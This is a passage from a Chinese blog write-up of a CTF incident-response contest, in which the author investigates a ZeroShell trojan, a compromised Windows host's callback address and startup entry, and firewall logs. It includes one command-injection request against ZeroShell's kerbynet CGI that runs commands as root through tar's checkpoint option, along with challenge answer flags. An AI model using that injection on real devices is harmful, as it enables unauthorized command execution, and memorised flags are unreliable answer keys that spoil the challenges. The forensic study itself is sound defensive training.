<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /proc/10565/exe 来查找运行文件；找到为.nginx</span><br><span class="line">他还是个隐藏文件，比赛结束之后复现可能没有上边的↑关于外部链接的进程</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241217133801037.png?raw=true" alt="image-20241217133801037"></p>
<h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥flag{11223344qweasdzxc}</p>
<p>直接xxd就可以观看了</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241217134157922.png?raw=true" alt="image-20241217134157922"></p>
<h4 id="下载方法2"><a href="#下载方法2" class="headerlink" title="下载方法2"></a>下载方法2</h4><p>没试过，听说可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget &quot;http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=%27cat%20/tmp/.nginx%27%0A%27&quot;</span><br></pre></td></tr></table></figure>



<h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p>请写出驻留木马的启动项，注意写出启动文件的完整路径。结果提交形式：flag{xxxx}，如flag{&#x2F;a&#x2F;b&#x2F;c}</p>
<p>在shell中不断查询⽂件，寻找包含”.nginx”字符串的⽂件，最终在&#x2F;var主⽬录下找到</p>
<p> flag{&#x2F;var&#x2F;register&#x2F;system&#x2F;startup&#x2F;scripts&#x2F;nat&#x2F;File}</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241217134526844.png?raw=true" alt="image-20241217134526844"></p>
<h2 id="WinFT"><a href="#WinFT" class="headerlink" title="WinFT"></a>WinFT</h2><p>某单位网管日常巡检中发现某员工电脑（IP：192.168.116.123）存在异常外连及数据传输行为，随后立即对该电脑进行断网处理，并启动网络安全应急预案进行排查。</p>
<p>（本题附件见于提前下载的加密附件82f13fdc9f7078ba29c4a6dcc65d8859.7z，解压密码为3604e2f3-585a-4972-a867-3a9cc8d34c1d ）</p>
<h3 id="1-1"><a href="#1-1" class="headerlink" title="_1"></a>_1</h3><p>受控机木马的回连域名及ip及端口是（示例：flag{xxx.com:127.0.0.1:2333}）</p>
<h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>文档里面有个病毒exe文件;或者在火绒剑的网络上面也可以看到这个exe毒</p>
<p>点开桌面的火绒剑，再点击网络可以看到远程地址<br>将文件丢到微步云沙箱<a target="_blank" rel="noopener" href="https://s.threatbook.com/%E5%8F%AF%E4%BB%A5%E6%89%BE%E5%88%B0%E5%9B%9E%E8%BF%9E%E5%9C%B0%E5%9D%80">https://s.threatbook.com/可以找到回连地址</a></p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241215153751935.png?raw=true" alt="image-20241215153751935"></p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241215154649242.png?raw=true" alt="image-20241215154649242"></p>
<p>flag{miscsecure.com:192.168.116.130:443}</p>
<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>分析里面的数据包</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241217140021844.png?raw=true" alt="image-20241217140021844"></p>
<h3 id="2-1"><a href="#2-1" class="headerlink" title="_2"></a>_2</h3><p>受控机启动项中隐藏flag是</p>
<p>按 <strong>Win + R</strong> 打开运行对话框。</p>
<p>输入 <code>taskschd.msc</code>，然后按回车键。</p>
<p>里面就这一个东西</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241217141035890.png?raw=true" alt="image-20241217141035890"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f^l^a^g^:JiM3ODsmIzEwNTsmIzk5OyYjMTAxOyYjNjUyOTI7JiMxMDI7JiMxMDg7JiM5NzsmIzEwMzsmIzMyOyYjMTA1OyYjMTE1OyYjMzI7JiMxMjM7JiM2NTsmIzY5OyYjODM7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzk1OyYjMTA1OyYjMTE1OyYjOTU7JiM5NzsmIzExMDsmIzk1OyYjMTAxOyYjMTIwOyYjOTk7JiMxMDE7JiMxMDg7JiMxMDg7JiMxMDE7JiMxMTA7JiMxMTY7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzEyNTs=</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241217141336747.png?raw=true" alt="image-20241217141336747"></p>
<h3 id="3-1"><a href="#3-1" class="headerlink" title="_3"></a>_3</h3><p>受控机中驻留的flag是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="4-1"><a href="#4-1" class="headerlink" title="_4"></a>_4</h3><p>受控源头隐藏的flag是</p>
<h3 id="5-1"><a href="#5-1" class="headerlink" title="_5"></a>_5</h3><p>分析流量，获得压缩包中得到答案</p>
<p>将流量包放入随波逐流，foremost，出来有压缩包</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241217143529864.png?raw=true" alt="image-20241217143529864"></p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241217143919284.png?raw=true" alt="image-20241217143919284"></p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241217143910176.png?raw=true" alt="image-20241217143910176"></p>
<p>火绒报毒，压缩包损坏，关闭防火墙重新foremost一遍</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241217144212905.png?raw=true" alt="image-20241217144212905"></p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241217144414546.png?raw=true" alt="image-20241217144414546"></p>
<p>发现不是这个问题，修复一下压缩包，出flag</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20241217144734130.png?raw=true" alt="image-20241217144734130"></p>
<h3 id="6-1"><a href="#6-1" class="headerlink" title="_6"></a>_6</h3><p>通过aes解密得到的flag</p>
<h2 id="sc05-1"><a href="#sc05-1" class="headerlink" title="sc05_1"></a>sc05_1</h2><p>近日某公司网络管理员老张在对安全设备进行日常巡检过程中发现防火墙设备日志中产生了1条高危告警，告警IP为134.6.4.12（简称IP1），在监测到可疑网络活动后，老张立刻对磁盘和内存制做了镜像。为考校自己刚收的第一个徒弟李华，老张循序渐进，布置了5道问题。假如你是李华，请你根据提供的防火墙日志、磁盘镜像及内存镜像文件对主机开展网络安全检查分析，并根据5道问题提示，计算并提交相应flag。</p>
<p>（本题附件见于提前下载的加密附件38c44f100028b56e09dc48522385fa95.7z，解压密码为 37af3744-53eb-49fd-854a-f6f79bbf5b1c ）</p>
<h3 id="1-2"><a href="#1-2" class="headerlink" title="_1"></a>_1</h3><p>IP1地址首次被请求时间是多久？计算内容如：2020&#x2F;05&#x2F;18_19:35:10 提交格式：flag{32位大写MD5值}</p>
<p>文档直接ctrl+f搜索就行了</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">DDL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF-%E9%93%81%E4%B8%89/">http://example.com/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF-%E9%93%81%E4%B8%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/5wp/">5wp</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8ACN-fnst-CTF/" title="第二届CN-fnst::CTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">第二届CN-fnst::CTF</div></div><div class="info-2"><div class="info-item-1">CN-fnst::CTFweb1ez_python盲猜是文件包含file题目是python，读取源码；看到shell路由有个ssti  再看看waf &#x2F;?file&#x3D;&#x2F;app&#x2F;waf.py 123456def waf_check(value):    dangerous_patterns = [&#x27;os&#x27;, &#x27;set&#x27;, &#x27;__builtins__&#x27;, &#x27;=&#x27;, &#x27;.&#x27;, &#x27;&#123;&#123;&#x27;, &#x27;&#125;&#125;&#x27;, &#x27;popen&#x27;, &#x27;+&#x27;, &#x27;__&#x27;]    for pattern in dangerous_patterns:        if pattern in value:            return False    return...</div></div></div></a><a class="pagination-related" href="/2024/12/10/24%E5%9B%BD%E5%9F%8E%E6%9D%AF/" title="24国城杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">24国城杯</div></div><div class="info-2"><div class="info-item-1">2024国城杯1Easy Jellyjava欠着 2Ez_Gallery 账号admin；密码123456；直接爆也行，验证码可以重复用  存在文件包含，不知道flag在哪 info?file&#x3D;&#x2F;proc&#x2F;self&#x2F;cmdline发现题目app.py；然后去读取题目源码 源码的shell路由是个ssti攻击点 黑名单 12345678blacklist_patterns = [r&#x27;.*length.*&#x27;,r&#x27;.*count.*&#x27;,r&#x27;.*[0-9].*&#x27;,r&#x27;.*\..*&#x27;,r&#x27;.*soft.*&#x27;]if any(re.search(pattern, expression) for pattern in blacklist_patterns):return Response(&#x27;wafwafwaf&#x27;)try:result...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/02/27/vnctf2025javaGuide/" title="vnctf2025javaGuide"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-27</div><div class="info-item-2">vnctf2025javaGuide</div></div><div class="info-2"><div class="info-item-1">javaGuide先试了试别的师傅的wp，学习了一下二次反序列化 https://www.cnblogs.com/LAMENTXU/articles/18705991 https://xz.aliyun.com/news/15977 https://tttang.com/archive/1701/ 原版payload123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135package org.example.fj2.num3;import...</div></div></div></a><a class="pagination-related" href="/2025/03/17/THM%E7%AC%94%E8%AE%B0/" title="THM笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-17</div><div class="info-item-2">THM笔记</div></div><div class="info-2"><div class="info-item-1">THM笔记部分太过简单就不再记录 Medium上有很多wp，可以借鉴 基础知识IPInternet protocol  网络地址192.168.1.1 主机地址192.168.1.101 默认网关192.168.1.255 向别的网关发送数据    MAC地址Media Access Control 前6个字符代表制造网络接口的公私，后六个字符是一个唯一的数字 LAN连接方式拓扑(Topology  星型 通过交换机或集线器连接 添加方便，成本高，不适合大规模   总线拓扑 有主干电缆， 成本低，排查困难   环形拓扑 一个坏就全完       特性 集线器（Hub） 交换机（Switch） 中继器（Repeater）    工作层次 物理层（Layer 1） 数据链路层（Layer 2） 物理层（Layer 1）   数据传输 广播所有端口 根据 MAC 地址定向转发 放大并转发信号   带宽 所有端口共享带宽 每个端口独立带宽 无带宽概念，仅用于信号放大   智能 无智能，仅转发数据 智能转发数据，避免广播 无智能，仅放大信号   ARPAddress Resolution...</div></div></div></a><a class="pagination-related" href="/2024/12/03/wucup/" title="2024WuCup-wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-03</div><div class="info-item-2">2024WuCup-wp</div></div><div class="info-2"><div class="info-item-1">wucup-DDLmisc太极   1234567891011tai ji sheng liang yiliang yi sheng si xiangsi xiang sheng ba guaba gua ding ji xiongji xiong sheng da yetieny   12341---太极亦是轮回lieig     123 2(1212 -4) 5   ----周而复始sieau      1232 2(12312)jieay        12321(12121)   元神WuCup{0e49b776-b732-4242-b91c-8c513a1f12ce}  WuCup{7c16e21c-31c2-439e-a814-bba2ca54101a} 把docx文件换成zip文件  模糊的这个东西，减淡加弱化 WuCup{6bb9d97d-7169-434b-a7cf-0ee0b6fdfa30}      ...</div></div></div></a><a class="pagination-related" href="/2024/12/17/%E7%AC%AC%E4%BA%8C%E5%B1%8ACN-fnst-CTF/" title="第二届CN-fnst::CTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-17</div><div class="info-item-2">第二届CN-fnst::CTF</div></div><div class="info-2"><div class="info-item-1">CN-fnst::CTFweb1ez_python盲猜是文件包含file题目是python，读取源码；看到shell路由有个ssti  再看看waf &#x2F;?file&#x3D;&#x2F;app&#x2F;waf.py 123456def waf_check(value):    dangerous_patterns = [&#x27;os&#x27;, &#x27;set&#x27;, &#x27;__builtins__&#x27;, &#x27;=&#x27;, &#x27;.&#x27;, &#x27;&#123;&#123;&#x27;, &#x27;&#125;&#125;&#x27;, &#x27;popen&#x27;, &#x27;+&#x27;, &#x27;__&#x27;]    for pattern in dangerous_patterns:        if pattern in value:            return False    return...</div></div></div></a><a class="pagination-related" href="/2024/12/08/2024polar-winter/" title="2024polar-winter"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-08</div><div class="info-item-2">2024polar-winter</div></div><div class="info-2"><div class="info-item-1">2024polarctf-web冬季个人挑战赛【WEB】xxmmll这个是先bp发个包，响应的有个php文件，进去之后有个输入框 1  【WEB】赌王 –没做出来直接发空爆破 你可以去ed3d2c21991e3bef5e069713af9fa6ca这个目录下看看,但是这个提示不对，这是个php文件  进入之后会提示,输入数字会在你原有的数字后边+1；长度限制为20  存在xss漏洞但是没东西 数字unicode绕过+科学计数法+全字符绕过   不好使，好像是没被解析 复现123&lt;script&gt;confirm(1);&lt;/script&gt;按提示去xss;提示如下↓就c你o还n想f弹i窗r,m  给出另一个文件php,然后网页源代码有提示，伪造本地IP；然后去命令执行  【WEB】狗黑子的RCEps看进程，里面没事，env看环境变量，有个假flag   打开文件使用函数替换 rev strings  查看目录文件使用函数替换 find &#x2F;       **find**列出目录及其子目录中的文件。 出flag.php   du &#x2F;       ...</div></div></div></a><a class="pagination-related" href="/2025/01/16/2024%E7%AC%AC%E4%B8%80%E5%9C%BAciscn-ctfshow%E5%A4%8D%E7%8E%B0/" title="2024第一场ciscn-ctfshow复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-16</div><div class="info-item-2">2024第一场ciscn-ctfshow复现</div></div><div class="info-2"><div class="info-item-1">2024ciscn第一场本章内容均在ctfshow复现 sanicpython污染 源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from sanic import Sanicfrom sanic.response import text, htmlfrom sanic_session import Sessionimport pydash# pydash==5.1.2class Pollute:    def __init__(self):        passapp = Sanic(__name__)app.static(&quot;/static/&quot;, &quot;./static/&quot;)Session(app)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])async def index(request):...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">DDL</div><div class="author-info-description">WELCOME MY GARBAGE DUMP</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DDL08"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/DDL08" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2179219117@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">师傅加个联系方式，讨论交流学习，若有不足还请师父指出</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%9B%BD%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">第二届国赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Safe-Proxy"><span class="toc-number">1.1.1.</span> <span class="toc-text">Safe_Proxy</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">法一盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%E8%A6%86%E7%9B%96"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">法二覆盖</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-web"><span class="toc-number">1.1.2.</span> <span class="toc-text">hello_web</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zeroshell"><span class="toc-number">1.3.</span> <span class="toc-text">zeroshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">1.3.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2"><span class="toc-number">1.3.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3"><span class="toc-number">1.3.3.</span> <span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4"><span class="toc-number">1.3.4.</span> <span class="toc-text">4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5"><span class="toc-number">1.3.5.</span> <span class="toc-text">5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%952"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">下载方法2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6"><span class="toc-number">1.3.6.</span> <span class="toc-text">6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WinFT"><span class="toc-number">1.4.</span> <span class="toc-text">WinFT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">_1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1"><span class="toc-number">1.4.2.</span> <span class="toc-text">_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1"><span class="toc-number">1.4.3.</span> <span class="toc-text">_3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1"><span class="toc-number">1.4.4.</span> <span class="toc-text">_4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1"><span class="toc-number">1.4.5.</span> <span class="toc-text">_5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1"><span class="toc-number">1.4.6.</span> <span class="toc-text">_6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sc05-1"><span class="toc-number">1.5.</span> <span class="toc-text">sc05_1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2"><span class="toc-number">1.5.1.</span> <span class="toc-text">_1</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/27/2025TGctf/" title="2025TGctf">2025TGctf</a><time datetime="2025-04-27T08:36:37.000Z" title="Created 2025-04-27 16:36:37">2025-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/27/%E5%85%8D%E6%9D%80%E8%BF%87%E7%81%AB%E7%BB%92%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/" title="免杀过火绒思路整理">免杀过火绒思路整理</a><time datetime="2025-04-27T08:28:12.000Z" title="Created 2025-04-27 16:28:12">2025-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/03/THM-Ra2/" title="THM-Ra2">THM-Ra2</a><time datetime="2025-04-03T10:32:00.000Z" title="Created 2025-04-03 18:32:00">2025-04-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/17/THM%E7%AC%94%E8%AE%B0/" title="THM笔记">THM笔记</a><time datetime="2025-03-17T11:15:33.000Z" title="Created 2025-03-17 19:15:33">2025-03-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/17/2024%E9%B9%8F%E7%A8%8B%E6%9D%AF/" title="2024鹏程杯">2024鹏程杯</a><time datetime="2025-03-17T11:12:08.000Z" title="Created 2025-03-17 19:12:08">2025-03-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By DDL</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
  const option = null

  const initValine = (el, path) => {
    if (isShuoshuo) {
      window.shuoshuoComment.destroyValine = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    const valineConfig = {
      el: '#vcomment',
      appId: 'HVeI0ARPlb1wmqNwceN5bAr0-gzGzoHsz',
      appKey: 'budtvYOInoQ1hIEDD2X5VhXq',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      visitor: false,
      ...option,
      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
    }

    new Valine(valineConfig)
  }

  const loadValine = async (el, path) => {
    if (typeof Valine === 'function') {
      initValine(el, path)
    } else {
      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
      initValine(el, path)
    }
  }

  if (isShuoshuo) {
    'Valine' === 'Valine'
      ? window.shuoshuoComment = { loadComment: loadValine }
      : window.loadOtherComment = loadValine
    return
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>